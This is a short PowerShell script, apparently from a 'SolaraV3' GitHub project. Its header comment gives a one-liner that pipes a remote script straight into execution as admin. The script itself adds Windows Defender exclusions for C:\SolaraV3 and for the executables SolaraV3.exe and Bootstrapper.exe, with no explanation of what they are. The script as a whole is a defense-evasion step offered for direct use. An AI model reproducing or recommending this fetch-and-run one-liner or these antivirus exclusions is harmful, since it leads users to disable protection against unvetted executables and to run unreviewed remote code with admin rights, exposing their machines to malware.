# Add Solara folder to Windows Defender exclusions (run as admin)
#   irm https://raw.githubusercontent.com/ChampionWand/SolaraV3/main/scripts/add-exclusion.ps1 | iex
$ErrorActionPreference = "Stop"
$Path = "C:\SolaraV3"
if (-not (Test-Path $Path)) { New-Item -ItemType Directory -Force -Path $Path | Out-Null }
Add-MpPreference -ExclusionPath $Path
Add-MpPreference -ExclusionProcess "SolaraV3.exe"
Add-MpPreference -ExclusionProcess "Bootstrapper.exe"
Write-Host "[+] Defender exclusion added: $Path" -ForegroundColor Green
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
